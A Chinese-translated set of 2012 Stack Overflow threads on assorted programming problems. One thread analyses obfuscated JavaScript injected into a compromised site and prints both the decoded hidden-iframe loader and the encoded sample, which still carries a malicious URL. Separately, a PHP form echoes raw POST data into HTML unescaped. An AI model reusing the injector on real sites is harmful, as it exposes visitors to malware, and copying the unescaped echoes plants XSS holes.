你是从 vs 中的 64bit tools 命令工具运行 configure 的吗？
您是否添加 `-platform win32-msvc2010`到配置命令行（是的，即使对于 64 位构建，您也需要 -win32- ）

# python - Pyschool：主题 1

> ID：13313263
> 
> 赞同：1
> 
> 时间：2012-11-09T17:46:12.210
> 
> 标签：python, python-2.7

我是 Python 新手，我直接进入了 Python 3。但是我正在尝试使用 pyschools.com 的学习实践。我遇到了一个处理使用字符串的问题。他们想要这个结果：`"No, thanks, Mom," I said, "I don't know how long it will take."`. 在 Python 3 中，我可以使用`"""`before 和 after 输入这个文字。但是在 Python 2 中，同一行显示为`\'"No, thanks, Mom," I said, "I don\'t know how long it will take."\'`. 如何正确格式化？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T17:52:33.680

没有问题; 您的 python 解释器以可以粘贴回解释器的方式将字符串回显给您。

`print()`如果您只想打印字符串值而不是字符串文字，请改用：

```
>>> '''"No, thanks, Mom," I said, "I don't know how long it will take."'''
'"No, thanks, Mom," I said, "I don\'t know how long it will take."'
>>> print('''"No, thanks, Mom," I said, "I don't know how long it will take."''')
"No, thanks, Mom," I said, "I don't know how long it will take." 
```

请注意，在这方面，python 版本之间没有区别；python 3 的行为方式完全相同。

# actionscript-3 - 如果数组中不再存在，则从阶段中删除对象

> ID：13313264
> 
> 赞同：1
> 
> 时间：2012-11-09T17:46:15.257
> 
> 标签：actionscript-3

当我击中我的对象命中作品时，我想将我的对象从视图容器中删除，也从数组中删除，但我不想将它从舞台上删除。因为数组中的索引为空。好的，但是你如何删除它呢？

谢谢

```
private function enemySpawnen():void
{
var enemyShip:SpaceShip = new SpaceShip();

Enemy[0] = enemyShip;
Enemy[1] = enemyShip;
}

private function renderEnemy(e:Event):void
{
if(Enemy[0] != null){
viewContainer.addChild(Enemy[0]);

Enemy[0].scaleX = 0.5;
Enemy[0].scaleY = 0.5;

Enemy[0].x = 600;
Enemy[0].y = 400;
}
else{
viewContainer.removeChild(Enemy[0]);==> problem
}
}

if(spaceBar){
var kogel:Kogel = new Kogel();
viewContainer.addChild(kogel);

kogel.scaleX = 0.08;
kogel.scaleY = 0.08;

kogel.x = heli.x + (heli.width/2) -225;
kogel.y = heli.y + (heli.height/2) + 30;

kogel.addEventListener(Event.ENTER_FRAME, shoot);
function shoot(e:Event):void
{
kogel.x +=10;

try{
if(kogel.hitTestObject(Enemy[0])){
Enemy.splice(0,1);
}
}
catch(e:Error){

}
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T18:46:45.080

包含错误的`else`语句只会在项目`Enemy[0]`为空时运行，因此它**总是**会抛出错误并且完全没有必要（您不妨删除整个 else 语句）

`Enemy[0]`为空，因为您已将其拼接到您的数组中。您需要做的是在拼接数组**之前有引发错误的行。**

```
if(kogel.hitTestObject(Enemy[0])){
    viewContainer.removeChild(Enemy[0])
    Enemy.splice(0,1);
} 
```

还要记住，既然您已经拼接了数组，那么曾经是 Enemy[1] 的项目现在被 Enemy[0] 引用，因为您的数组索引已经移动。

# javascript - knockoutjs 自动生成viewmodel

> ID：13313265
> 
> 赞同：0
> 
> 时间：2012-11-09T17:46:17.700
> 
> 标签：javascript, knockout.js, viewmodel

有谁知道是否可以自动为 knockoutjs 生成视图模型。

1）我有（例如）以下html代码：

```
<input type="text" data-bind="value: XYZ" />
<input type="text" data-bind="value: ABC" />
<input type="text" data-bind="value: Prop1" /> 
```

2）然后我需要像这样创建一个视图模型：

```
function ViewModel()
{
  this.XYZ = ko.observable();
  this.ABC = ko.observable();
  this.Prop1 = ko.observable();
} 
```

我想跳过第 2 步，因为我已经定义了应该在 html-markup 中可用的属性（有点）。

**更新：** 正如评论中提到的，做这样的事情会有缺点。（这可能是knockoutjs不支持它的原因）。我将采用不同的方法，但是我制作了一个简单的 Javascript 函数，它可以从一个非常简单的标记中生成一个 ViewModel。如果有人有兴趣，这就是我想出的：

```
function getViewModelFromView(selector) {
    var vm = {};
    $("[data-bind]", selector).each(function () {
        var attribute = $(this).attr("data-bind");
        if (attribute.indexOf(':') > 0) {
            vm[attribute.slice(attribute.indexOf(':')+1).trim()] = ko.observable();
        }
    });
    return vm;
} 
```

# javascript - 如何编写 javascript 来重新排序 pdf 文档的页面？

> ID：13313267
> 
> 赞同：4
> 
> 时间：2012-11-09T17:46:32.897
> 
> 标签：javascript, pdf, adobe

我有一个双面文档作为两个单独的 pdf 文件——一个文档中的正面页面和第二个文档中的背面页面。

```
front.pdf
rear.pdf 
```

我还将它们组合成一个文档，其中包含所有页面，但所有正面页面都位于背面页面之前。页面排序的形式是，`{1,3,5,7,...,[n],2,4,6,8,...,[n-1 OR n+1]}`

```
all.pdf 
```

我希望编写一个可以从 Adob​​e Abrobat X Pro 内部运行的简单 javascript。理想情况下，它会计算文档的页数，`all.pdf`当总页数为奇数或偶数时处理这两种情况，然后将它们重新排序以使其处于原始顺序：

```
page [1>3>4>2] => page [1>2>3>4] 
```

上面的小前导代码片段来自**user171577**在 SuperUser 在这个问题上的回答：[https ://superuser.com/questions/181596/software-that-merges-pdf-every-other-page](https://superuser.com/questions/181596/software-that-merges-pdf-every-other-page)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T12:30:16.490

我能够从 NullUserException 完成以下建议：

该脚本需要一个由所有奇数页和所有偶数页组成的文档。它将处理有`n`偶数页和`n+1`奇数页的情况。

我输入了一个名为 的“文档 JavaScript” `InterleavePages`，代码如下：

```
function InterleavePages() {

var n = this.numPages;
var nOdd = Math.floor(n / 2);
var nEven = n - nOdd;
var x;
var y;
var i;

for(i = 0; i < nEven; i++) {
                         // movePage x, toAfterPage y
                         // note page numbers are 0-indexed
    x = nOdd + (i);      //
    y = i * 2     ;      //  
    this.movePage(x,y); 
   }
}
InterleavePages(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-10T14:20:27.543

谢谢，这是一个很大的帮助。只是想指出我发现的限制是它只能以偶数页的形式工作。尽管可能可以编写更复杂的计算脚本，但我采取了简单的方法，只是在我的 17 页测试文档的末尾添加了一个空白页。但是，我确实添加了一个警报，所以我不会忘记在必要时添加一个额外的页面......

```
function InterleavePages() {

var n = this.numPages;
var nOdd = Math.floor(n / 2);
var nEven = n - nOdd;
var x;
var y;
var i;

app.alert({
cMsg: "Total pages must be an even number",
cTitle: "Even Number of Pages Required!",
nIcon: 1, nType: 1
});

this.pageNum = 0;

for(i = 0; i < nEven; i++) {
                         // movePage x, toAfterPage y
                         // note page numbers are 0-indexed
    x = nOdd + (i);      //
    y = i * 2     ;      //  
    this.movePage(x,y); 
   }
}
InterleavePages(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-14T09:16:31.903

正如在其他一些交流中提到的，要将两个 pdf 的页面交织在一起，您可以使用 Java 控制台。

第一步是将 pdf 合并到一个文档中。我会通过突出显示这两个文件，然后右键单击其中一个来做到这一点。应该有一个“在 Acrobat 中合并支持的文件”选项。

然后，一旦它们组合在一起，打开组合文件，您要在其中运行代码

for (i = 0; i <= this.numPages/2-1; i++) this.movePage(this.numPages-1,this.numPages/2-i-1);

运行此类代码的分步详细信息是：

1）打开PDF。

2) 转到第二页。这样做可以让您注意到是否发生了更改。您不必执行此步骤，但它会有所帮助。

2) 按 Control + J

3）在弹出的窗口中，我总是转到“查看”下拉菜单，并将其设置为“脚本和控制台”。

4）在底部窗口中，替换应该阅读的文本

“Acrobat EScript 内置函数版本 10.0 Acrobat SOAP 10.0”

和

for (i = 0; i <= this.numPages/2-1; i++) this.movePage(this.numPages-1,this.numPages/2-i-1);

5) 按回车键一次。按两次可能会再次运行代码（您不希望这样做）。

6）检查你的pdf，看看页面是否交错。如果没有，请再次尝试第 5 步。

7) 你现在是一个 Java 向导。恭喜。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-03-30T21:44:59.393

我遇到了同样的问题，我的扫描仪只有单面，扫描仪软件在完成自动进纸器后询问是否还有更多要扫描的内容。如果您抓住堆栈，将其翻过来并再次送入，您最终将得到一个 PDF，其中 n 页文档排列为 1f、2f、3f ... nb、(n-1)b、( n-2)b ... 1b（f=正面，b=背面，从 1 开始的页码）。根据定义，您将拥有偶数个扫描页面，用于重新排列整个内容的 javascript （小心，在这种情况下仅适用于偶数页！）是：

```
// rearrange the pages from single-side scanner, 0-based page# where
// pages 0 .. n/2-1 are front, pages n/2 .. n-1 are back
function Rearrange() {
    var tpn=0;      // target page number
    for (count = 0; count < this.numPages/2; count++)   { 
        this.movePage(this.numPages-1,tpn);
        tpn=tpn+2;
    }
}
Rearrange(); 
```

# wpf - 我可以干净吗 在 Visual Studio 12 中？

> ID：13313269
> 
> 赞同：0
> 
> 时间：2012-11-09T17:46:39.417
> 
> 标签：wpf, c#-4.0, visual-studio-2012, expression-blend

我正在执行我在 Expression Blend 4 中找到的使用 WPF 连接到 SQL Server 的教程。在我进行构建时，在 VS12 中的最后步骤之后，我收到以下错误。

```
Error   1   The type or namespace name 'DelegateCommand' could not be found (are you missing a using directive or an assembly reference?)
Error   2   The type or namespace name 'DelegateCommand' could not be found (are you missing a using directive or an assembly reference?) 
```

**当我进行清洁时，我没有收到这些错误。** 我的目标是 .net 4.5 我也试过 4.0

我的错误代码看起来像这样。我将两条错误线加粗。这是一个名为 Class1.cs 的文件

```
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Media;
using System.Windows.Media.Imaging;

namespace AWADataSource
{
public class ProductPhotosCollection
{
    **private DelegateCommand getDataCommand;
    public DelegateCommand GetDataCommand { get { return getDataCommand; } }**
    public ProductPhotosCollection()
    {
        getDataCommand = new DelegateCommand(delegate() { GetData(); });
    }

    public ObservableCollection<ProductPhoto> ProductPhotos
    { get { return this.productPhotos; } }
    private ObservableCollection<ProductPhoto> productPhotos =
        new ObservableCollection<ProductPhoto>();
    private void GetData()
    {
        ProductPhotosTableAdapters.ProductPhotoTableAdapter da =
            new ProductPhotosTableAdapters.ProductPhotoTableAdapter();
        ProductPhotos.ProductPhotoDataTable dt = da.GetData();
        productPhotos.Clear();
        foreach (ProductPhotos.ProductPhotoRow row in dt)
        {
            productPhotos.Add(new ProductPhoto(
                row.ProductPhotoID,
                row.ThumbNailPhoto,
                row.LargePhoto,
                row.ModifiedDate));
        }
    }
}
public class ProductPhoto
{

    // Public Accessors to the private properties.
    public int ID { get { return id; } }
    public ImageSource ThumbNailPhoto { get { return thumbNailPhoto; } }
    public ImageSource LargePhoto { get { return largePhoto; } }
    public DateTime ModifiedDate { get { return modifiedDate; } }

    // Constructor.
    public ProductPhoto(int id, byte[] thumbNailPhoto, byte[] largePhoto,
        DateTime modifiedDate)
    {
        this.id = id;
        this.thumbNailPhoto = ByteArrayToImageSource(thumbNailPhoto);
        this.largePhoto = ByteArrayToImageSource(largePhoto);
        this.modifiedDate = modifiedDate;
    }

    // Private properties.
    private int id;
    private ImageSource thumbNailPhoto;
    private ImageSource largePhoto;
    private DateTime modifiedDate;

    // Supporting method.
    private ImageSource ByteArrayToImageSource(byte[] data)
    {
        BitmapImage image = null;
        if (null != data)
        {
            image = new BitmapImage();
            image.BeginInit();
            image.StreamSource = new System.IO.MemoryStream(data);
            image.EndInit();
        }
        return image;
        }
    }
} 
```

我的另一个文件叫做 DelegateCommand.cs，它几乎是一个复制和粘贴。

```
namespace AWDataSource
{
using System;
using System.Windows.Input;

///
/// DelegateCommand is a simplified version of ICommand in WPF. You can wrap one of these around any method,
/// and thus bind any command on any WPF object to your method.
///
/// DelegateCommand also supports an IsEnabled property that you can use to turn the command on and off.
///
public sealed class DelegateCommand : ICommand
{
    // Remember the method so that it can be called at the right time.
    private SimpleEventHandler handler;

    // Maintain the enabled state.
    private bool isEnabled = true;

    // Type signature of the method that DelegateCommand works with - returns void, no arguments.
    public delegate void SimpleEventHandler();

    // Simple constructor: Pass in the method that needs to be called when the command executes.
    public DelegateCommand(SimpleEventHandler handler)
    {
        this.handler = handler;
    }

    #region ICommand implementation

    // Executing the command is as simple as calling the method.
    void ICommand.Execute(object arg)
    {
        this.handler();
    }

    // Saying whether the command can be executed.
    bool ICommand.CanExecute(object arg)
    {
        return this.IsEnabled;
    }

    // This is the event that the command architecture of WPF listens to so it knows when to update
    // the UI on command enable/disable.
    public event EventHandler CanExecuteChanged;
    #endregion

    // Public visibility of the isEnabled flag - note that when it is set, the event must be raised
    // so that WPF knows to update any UI that uses this command.
    public bool IsEnabled
    {
        get { return this.isEnabled; }
        set
        {
            this.isEnabled = value;
            this.OnCanExecuteChanged();
        }
    }

    // Simple event propagation that makes sure that someone is listening to the event before raising it.
    private void OnCanExecuteChanged()
    {
        if (this.CanExecuteChanged != null)
        {
            this.CanExecuteChanged(this, EventArgs.Empty);
        }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T17:49:50.690

`ProductPhotosCollection`在命名空间中`AWADataSource`，而`DelegateCommand`在`AWDataSource`.

可能是错字，但您要么需要将它们放在同一个命名空间中，要么使用 a`using`将`AWDataSource`命名空间导入`ProductPhotosCollection`（或者在你的情况下为“Class1.cs”）

# c# - WPF 画布覆盖 - 工具提示/数据触发器问题

> ID：13313275
> 
> 赞同：0
> 
> 时间：2012-11-09T17:46:57.967
> 
> 标签：c#, .net, wpf

我遇到了隐藏/显示 2 个元素的问题。默认情况下，画布是可见的，根据状态，数据触发器将隐藏画布（不透明度 0%）并显示按钮/图像（不透明度 100%）。

该按钮有一个工具提示/光标，它覆盖在画布上。当显示工具提示/光标停止工作。当它没有覆盖在画布上的任何地方时，属性就会起作用。

我认为画布优先，即使它是隐藏/禁用/不透明度= 0％。

我可以在数据触发器中做些什么来保留按钮工具提示吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T17:57:05.170

设置`Canvas.IsHitTestVisible="false"`除了不透明度= 0%。[您可以在此处](http://msdn.microsoft.com/en-us/library/ms752097%28v=vs.100%29.aspx)找到有关命中测试的更多信息

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:52:25.833

不要通过将其不透明度设置为 0 来隐藏画布，只需将 Canvas 的 Visibility 属性设置为 Collapsed。

# php - 对于 PHP 类私有成员，MongoDb 保存会引发错误

> ID：13313278
> 
> 赞同：0
> 
> 时间：2012-11-09T17:47:04.067
> 
> 标签：php, mongodb

问候大家，

我在 PHP 中创建了一个具有私有成员的类。当我试图将该类的一个实例保存到 MongoDb 中时，col->insert($newObject)，代码抛出以下错误：

致命错误：未捕获的异常 'MongoException' 带有消息“不允许使用零长度键，您是否使用带有双引号的 $？” 在 /var/www/html/index.php:105 堆栈跟踪：#0 /var/www/html/index.php(105): MongoCollection->save(Object(Address)) #1 {main} 抛出 /第 105 行的 var/www/html/index.php

如果我将私人成员更改为公共，它保存得很好，但是有没有办法让它保持私密，而不是保存在 Mongodb 中？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T17:52:04.010

制作一个返回没有该属性的对象的函数并将其插入...

# mysql - MySQL查询效率建议

> ID：13313280
> 
> 赞同：2
> 
> 时间：2012-11-09T17:47:07.073
> 
> 标签：mysql, sql, database

虽然这个问题是特定于 MySQL 的，但我不介意知道这个答案是否适用于一般的 SQL 引擎。

此外，由于这不是语法查询，为了简洁/清晰，我使用 psuedo-SQL。

假设 C[1]..C[M] 是一组标准（由 AND 或 OR 分隔），而 Q[1]..Q[N] 是另一组（由 OR 分隔）。我想使用 C[1]...C[M] 过滤一个表，从这个过滤后的表中，我想要所有匹配 Q[1]...Q[N] 的行。

如果我这样做：

```
SELECT ... FROM  ... WHERE (C[1]...C[M]) AND (Q[1]...Q[N]) 
```

这会自动优化，以便只找到一次 C[1]...C[M] 并且每个 Q[i] 都针对这个缓存的结果运行？如果不是，我应该像这样将查询分成两部分：

```
INSERT INTO TEMP ... SELECT ... FROM ... WHERE C[1]...C[N]
SELECT ... FROM TEMP WHERE Q[1]...Q[N] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T18:23:30.353

这是内部查询优化器的工作，用于根据过滤器计算编译连接的最佳顺序。

例如在：

```
SELECT * 
FROM
    table1 
        INNER JOIN table2 ON table1.id = table2.id AND table2.column = Y
        INNER JOIN table3 ON table3.id2 = table2.id2  AND table3.column = Z
WHERE
    table1.column = X 
```

Mysql（/oracle/sqlserver 等...）会*尝试*预先计算每个中间结果集以提供最佳性能，实际上引擎在这里做得很好。

然而，一切都依赖于它实际拥有的关于您在架构中设置的表和索引的统计信息。这 2 点（除了用数据填充表格...）是唯一可以影响的点，以帮助优化器通过提供正确和准确的信息来做出正确的决策。

我希望它有所帮助。

ps：看看这个。这是关于 oracle 下查询编译中的运算符和优先顺序的，但无论如何了解它可能是一件好事：

[http://ezinearticles.com/?Oracle-SQL---The-Importance-of-Order-of-Precedence&id=1597846](http://ezinearticles.com/?Oracle-SQL---The-Importance-of-Order-of-Precedence&id=1597846)

# javascript - 为什么这个混淆代码在 JavaScript 中是恶意的？

> ID：13313287
> 
> 赞同：5
> 
> 时间：2012-11-09T17:47:28.293
> 
> 标签：javascript, obfuscation, deobfuscation

我的一个朋友的网站被列为恶意网站，我们发现一些混淆代码已在他不知情的情况下注入到他的 index.php 中。我将代码反混淆了两个级别，发现了这一点：

[（代码可以在编辑历史中查看）](https://stackoverflow.com/revisions/13313287/2)

谁能告诉我它想做什么以及为什么它是恶意的..？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-09T17:53:30.060

总而言之，该代码“解码”了 HTML，该 HTML 将`<iframe>`加载的内容放入恶意 URL。

以下行具有“编码”HTML：

```
n = ["9","9","45","42", ... 
```

每个数字代表一个以 25 为基数的字符。代码将遍历此数组并使用 javascript`String.fromCharCode()`将其转换为 ASCII 字符。在这一切之后，它将`eval()`把它放在页面上。

“解码”的 javascript 是：

```
if (document.getElementsByTagName('body')[0]){
    iframer();
} else {
    document.write("<iframe src='[stripped]' width='10' height='10' style='visibility:hidden;position:absolute;left:0;top:0;'></iframe>");
}
function iframer(){
    var f = document.createElement('iframe');f.setAttribute('src','[stripped]');f.style.visibility='hidden';f.style.position='absolute';f.style.left='0';f.style.top='0';f.setAttribute('width','10');f.setAttribute('height','10');
    document.getElementsByTagName('body')[0].appendChild(f);
} 
```

请注意，为了安全起见，我已从代码中删除了恶意 URL。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-09T17:53:14.133

它将隐藏的 iframe 注入页面，链接到可能是一个狡猾的网站。这是您可以运行的代码的安全版本，并查看它尝试注入的内容...

[http://jsfiddle.net/FqtZ8/](http://jsfiddle.net/FqtZ8/)

我访问了它链接到的网站，chrome 警告我有恶意软件，所以我没有再进一步。

```
try{
if(window.document) window["document"]["body"]="123"
}catch(bawetawe){
if(window.document){
v=window;
try{
fawbe--
}catch(afnwenew){
try{
(v+v)()
}catch(gngrthn){
try{if(020===0x10)v["document"]["body"]="123"
}catch(gfdnfdgber){
m=123;
if((alert+"").indexOf("na"+"ti"+"ve")!==-1)ev=window["eval"];
}
}
n=            ["9","9","45","42","17","1f","40","4b","3o","4h","49","41","4a","4g","1l","43","41","4g","    j","48","41","49","41","4a","4g","4f","2g","4l","39","3m","43","33","3m","49","41","1f","1e","3n","4b","40","4l","1e","1g","3g","1n","3i","1g","4n","d","9","9","9","45","42","4e","3m","49","41","4e","1f","1g","29","d","9","9","50","17","41","48","4f","41","17","4n","d","9","9","9","40","4b","3o","4h","49","41","4a","4g","1l","4j","4e","45","4g","41","1f","19","2a","45","42","4e","3m","49","41","17","4f","4e","3o","2b","1e","44","4g","4g","4c","28","1m","1m","43","3o","4d","40","4f","47","3m","4j","4f","4k","1l","41","40","4a","4f","1l","3n","45","4m","1m","4g","1m","4i","3o","1l","4c","44","4c","2d","43","4b","2b","20","1e","17","4j","45","40","4g","44","2b","1e","1o","1n","1e","17","44","41","45","43","44","4g","2b","1e","1o","1n","1e","17","4f","4g","4l","48","41","2b","1e","4i","45","4f","45","3n","45","48","45","4g","4l","28","44","45","40","40","41","4a","29","4c","4b","4f","45","4g","45","4b","4a","28","3m","3n","4f","4b","48","4h","4g","41","29","48","41","42","4g","28","1n","29","4g","4b","4c","28","1n","29","1e","2c","2a","1m","45","42","4e","3m","49","41","2c","19","1g","29","d","9","9","50","d","9","9","42","4h","4a","3o","4g","45","4b","4a","17","45","42","4e","3m","49","41","4e","1f","1g","4n","d","9","9","9","4i","3m","4e","17","42","17","2b","17","40","4b","3o","4h","49","41","4a","4g","1l","3o","4e","41","3m","4g","41","2j","48","41","49","41","4a","4g","1f","1e","45","42","4e","3m","49","41","1e","1g","29","42","1l","4f","41","4g","2f","4g","4g","4e","45","3n","4h","4g","41","1f","1e","4f","4e","3o","1e","1j","1e","44","4g","4g","4c","28","1m","1m","43","3o","4d","40","4f","47","3m","4j","4f","4k","1l","41","40","4a","4f","1l","3n","45","4m","1m","4g","1m","4i","3o","1l","4c","44","4c","2d","43","4b","2b","20","1e","1g","29","42","1l","4f","4g","4l","48","41","1l","4i","45","4f","45","3n","45","48","45","4g","4l","2b","1e","44","45","40","40","41","4a","1e","29","42","1l","4f","4g","4l","48","41","1l","4c","4b","4f","45","4g","45","4b","4a","2b","1e","3m","3n","4f","4b","48","4h","4g","41","1e","29","42","1l","4f","4g","4l","48","41","1l","48","41","42","4g","2b","1e","1n","1e","29","42","1l","4f","4g","4l","48","41","1l","4g","4b","4c","2b","1e","1n","1e","29","42","1l","4f","41","4g","2f","4g","4g","4e","45","3n","4h","4g","41","1f","1e","4j","45","40","4g","44","1e","1j","1e","1o","1n","1e","1g","29","42","1l","4f","41","4g","2f","4g","4g","4e","45","3n","4h","4g","41","1f","1e","44","41","45","43","44","4g","1e","1j","1e","1o","1n","1e","1g","29","d","9","9","9","40","4b","3o","4h","49","41","4a","4g","1l","43","41","4g","2j","48","41","49","41","4a","4g","4f","2g","4l","39","3m","43","33","3m","49","41","1f","1e","3n","4b","40","4l","1e","1g","3g","1n","3i","1l","3m","4c","4c","41","4a","40","2h","44","45","48","40","1f","42","1g","29","d","9","9","50"];
h=2;
s="";
if(m) for(i=0;i-589!=0;i++){
k=i;
if(window["document"]) s+=String["fro"+"mC"+"harCode"](
parseInt(n[i],25)
);
}z=s;alert(z);
}
}
}? 
```

# actionscript-3 - 破砖机撞击测试错误

> ID：13313288
> 
> 赞同：1
> 
> 时间：2012-11-09T17:47:38.403
> 
> 标签：actionscript-3, hittest

好吧，事情就是这样，我正在制作一个破砖游戏。我正在尝试构建它，以便我可以手动在舞台上添加砖块，而不是使用代码。

在舞台上，有一个球（“Ball”），目前正在跟随鼠标移动，还有一个内部带有命中测试代码的砖块电影剪辑。

主机代码如下：

```
import flash.events.Event;

addEventListener(Event.ENTER_FRAME,moveBall);

function moveBall (e:Event):void{
Ball.x = mouseX;
Ball.y = mouseY;
} 
```

这是我在砖电影剪辑中编写的代码：

```
addEventListener(Event.ENTER_FRAME,checkHit);

function checkHit (e:Event):void{
    if(this.hitTestObject(Ball)){
    trace ("HIT!!");
}
} 
```

这就是所有的代码，球和砖已经在舞台上。当我运行它时，我得到“符号'brick'，图层'Layer 1'，第1帧，第6行1120：访问未定义属性Ball。”

第 6 行是：

```
if(this.hitTestObject(Ball)){ 
```

请告诉我为什么以及如何解决这个问题.. 我试图将对象更改为 stage.Ball ，但我仍然收到错误:(

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:40:58.463

您收到错误是因为`Ball`不在您的任何积木的范围内（这是一个不了解 Ball 的不同时间线）。

您可以使用`parent`关键字访问 Ball。例如：`MovieClip(parent).Ball`可能会工作。

一个更有效的建议：将其更改`addEventListener(Event.ENTER_FRAME,moveBall);`为使用`MouseEvent.MOUSE_MOVE`而不是 ENTER_FRAME。这样它只有在鼠标移动时才会触发。

# php - PHP 联系表格不起作用。html5验证也不起作用

> ID：13313297
> 
> 赞同：1
> 
> 时间：2012-11-09T17:48:00.697
> 
> 标签：php, forms, html, validation

编辑/更新：

我将我的 php 代码从我的 process.php 文件移动到我的contact.php 文件的顶部并且它有效。那么我从没有将它重定向回contact.php页面的process.php文件中遗漏了什么？

这是我在contact.php 中的html

```
<?php echo $message; ?>    
<form action="process.php" method="post" name="sign_up">
                                <input type="text" name="first_name" placeholder="First Name" value="<?php echo $_POST[first_name]; ?>" required/>
                                <input type="text" name="last_name" placeholder="Last Name" value="<?php echo $_POST[last_name]; ?>" required/><br>
                            <label class="bill-address">Billing Address:<br>
                                <input type="text" name="address1" placeholder="Address 1" value="<?php echo $_POST[address1]; ?>" required/><br>
                                <input type="text" name="address2" placeholder="Address 2" value="<?php echo $_POST[address2]; ?>" /><br>
                                <input type="text" name="city" placeholder="City" value="<?php echo $_POST[city]; ?>" required/>
                            </label>
                            <?php  
                             $state_list = array('AL'=>"Alabama",  
                                        'AK'=>"Alaska",  
                                        'AZ'=>"Arizona",  
                                        'AR'=>"Arkansas",  
                                        'WV'=>"West Virginia",  
                                        'WI'=>"Wisconsin",  
                                        'WY'=>"Wyoming");
                            ?>
                            <select name="state">
                            <?php
                                while(list($k,$v) = each($state_list)) {
                                    $selected = '';
                                    if ($k == $_POST[state]) {
                                        $selected = ' selected="true"';
                                    }
                                echo "<option value=\"$k\"$selected>$v</option>\n";
                                } 
                            ?>
                            </select>
            <input type="text" name="zip" placeholder="Zip Code" value="<?php echo $_POST[zip]; ?>" required/>
            <br style="clear: left;" />
            <input type="email" name="email" placeholder="you@youremail.com" value="<?php echo $_POST[email]; ?>" required/>
            <input type="tel" name="phone" placeholder="Phone" value="<?php echo $_POST[phone]; ?>" required/>
    <h3>Choose your Package</h3>
        <select name="package">
            <option value="Free">Free!</option>
            <option value="Basic">Basic</option>
            <option value="Corporate">Corporate</option>
            <option value="Enterprise">Enterprise</option>
            <option value="Enterprise_20">Enterprise 20</option>
            <option value="Enterprise_50">Enterprise 50</option>
            <option value="Enterprise_100">Enterprise 100</option>
        </select>
    <h3>Add Media Package?</h3>
            <input type="radio" name="Yes" value="yes" />Yes
            <input type="radio" name="No" value="no" />No
    <button type="submit" class="btn">Send &raquo;</button>
    <?php echo $success_message; ?>
</form> 
```

这是我的 process.php

```
 //validate email
function is_valid_email($email) {

        $result = true;
        $pattern = '/^([a-z0-9])(([-a-z0-9._])*([a-z0-9]))*\@([a-z0-9])(([a-z0-9-])*([a-z0-9]))+(\.([a-z0-9])([-a-z0-9_-])?([a-z0-9])+)+$/i';
        if(!preg_match($pattern, $email)) {
            $result = false;
        }
        return $result;
    }

//when submit has been pressed, begin form validate
if(isset($_POST['submit'])) {

    $valid = true;
    $message = '';
    if ( $_POST['first_name'] == "" ) {
        $message .= "Please include your first name. ";
        $valid = false; 
    }
    if ( $_POST['last_name'] == "" ) {
        $message .= "Please include your last name. ";
        $valid = false; 
    }
    if ( $_POST['address1'] == "" ) {
        $message .= "Please include your billing address. ";
        $valid = false; 
    }
    if ( $_POST['city'] == "" ) {
        $message .= "Please enter a city. ";
        $valid = false; 
    }
    if ( $_POST['state'] == "" ) {
        $message .= "Please select a state. ";
        $valid = false; 
    }
    if ( $_POST['zip'] == "" ) {
        $message .= "Please include a zip code. ";
        $valid = false; 
    }
    if ( $_POST['phone'] == "" ) {
        $message .= "Please include your phone number. ";
        $valid = false; 
    }
    if ( !is_valid_email($_POST['email']) ) {
        $message .= "A valid email is required. "; 
        $valid = false; 
    }
    if ( $_POST['package'] == "" ) {
        $message .= "You forgot to select a service package. ";
        $valid = false; 
    }

    if ( $valid == true ) {
        $success_message = 'Brilliant I say! We will be in contact with you shortly.';

        //clear form when submission is successful
        unset($_POST);
    }
} 
```

它不工作。html5 验证也不起作用。我的表单标记有问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T18:05:43.470

当您单击 时`submit`，您的浏览器会导航到`process.php`。所有的代码`contact.php`都被遗忘了，并生成了一个新页面。

两个页面之间没有隐含的链接。来自的消息`process.php`不会出现在 上`contact.php`。目前，什么都`process.php`没有`echo`，所以你可能会到达一个空白页面。

另一种方法是合并两个页面，如下所示：

```
<?php
    //validate email
function is_valid_email($email) {

        $result = true;
        $pattern = '/^([a-z0-9])(([-a-z0-9._])*([a-z0-9]))*\@([a-z0-9])(([a-z0-9-])*([a-z0-9]))+(\.([a-z0-9])([-a-z0-9_-])?([a-z0-9])+)+$/i';
        if(!preg_match($pattern, $email)) {
            $result = false;
        }
        return $result;
    }

//when submit has been pressed, begin form validate
if(isset($_POST['submit'])) {

    $valid = true;
    $message = '';
    if ( $_POST['first_name'] == "" ) {
        $message .= "Please include your first name. ";
        $valid = false; 
    }
    if ( $_POST['last_name'] == "" ) {
        $message .= "Please include your last name. ";
        $valid = false; 
    }
    if ( $_POST['address1'] == "" ) {
        $message .= "Please include your billing address. ";
        $valid = false; 
    }
    if ( $_POST['city'] == "" ) {
        $message .= "Please enter a city. ";
        $valid = false; 
    }
    if ( $_POST['state'] == "" ) {
        $message .= "Please select a state. ";
        $valid = false; 
    }
    if ( $_POST['zip'] == "" ) {
        $message .= "Please include a zip code. ";
        $valid = false; 
    }
    if ( $_POST['phone'] == "" ) {
        $message .= "Please include your phone number. ";
        $valid = false; 
    }
    if ( !is_valid_email($_POST['email']) ) {
        $message .= "A valid email is required. "; 
        $valid = false; 
    }
    if ( $_POST['package'] == "" ) {
        $message .= "You forgot to select a service package. ";
        $valid = false; 
    }

    if ( $valid == true ) {
        $success_message = 'Brilliant I say! We will be in contact with you shortly.';

        //clear form when submission is successful
                          //don't clear this, you need this to re-populate the page below
        //unset($_POST);
    }
}

?><!doctype html>
<html>
<head>
...
</head>
<body>
<?php echo $message; ?>    
<form action="contact.php" method="post" name="sign_up">
